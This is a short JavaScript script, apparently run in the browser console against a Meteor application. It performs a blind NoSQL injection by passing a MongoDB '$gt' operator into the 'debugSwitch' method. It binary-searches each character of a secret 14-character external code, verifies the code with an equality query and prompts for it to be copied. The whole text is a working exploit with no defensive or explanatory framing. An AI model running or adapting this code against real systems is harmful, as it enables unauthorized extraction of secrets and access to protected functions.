const debugSwitchGT = c=>new Promise((res, rej)=>Meteor.call('debugSwitch', {externalCode: {$gt: c}}, (e,r)=>e?rej(e):res(!!r[0])))
const debugSwitchEQ = c=>new Promise((res, rej)=>Meteor.call('debugSwitch', {externalCode: c}, (e,r)=>e?rej(e):res(!!r[0])))
const ord = c=>c.charCodeAt(0)
const chr = c=>String.fromCharCode(c)
const CODE_LENGTH = 14;

let code = '';

while (code.length < CODE_LENGTH) {
	let min = ord('a')
	let max = ord('z')

	// breaks if code ends with '9'...
	if (await debugSwitchGT(code+'a') === false) {
		min = ord('0')
		max = ord('9')
	}

	while (min < max-1) {
		let mid = min + ~~((max-min)/2)
		console.info(`trying ${chr(mid)} for ${code.length}`)
		if (await debugSwitchGT(code + chr(mid))) {
			min = mid
		} else {
			max = mid
		}
	}

	code += chr((code.length===CODE_LENGTH-1)?max:min);

	console.log(`code so far: ${code}`);
}

if (await debugSwitchEQ(code)) {
	prompt(`Copy the code`, code)
} else {
	alert('failed :( wait for code change')
}